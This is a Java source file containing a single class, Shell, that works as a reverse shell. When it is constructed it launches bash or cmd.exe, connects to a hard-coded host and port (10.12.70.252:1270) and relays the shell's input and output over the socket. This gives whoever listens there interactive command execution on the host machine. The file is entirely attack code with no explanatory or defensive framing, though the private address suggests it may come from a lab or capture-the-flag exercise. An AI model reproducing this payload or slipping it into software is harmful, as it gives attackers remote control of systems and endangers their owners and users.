import java.net.*;
import java.io.*;

public class Shell {
    public static final String host = "10.12.70.252";
    public static final String port = "1270";

    public Shell() throws Exception {
        try {
            String cmd = "bash";
            if (java.lang.System.getProperty("os.name").toLowerCase().contains("win")) {
                cmd = "cmd.exe";
            }
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, Integer.parseInt(port));
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (
                    Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
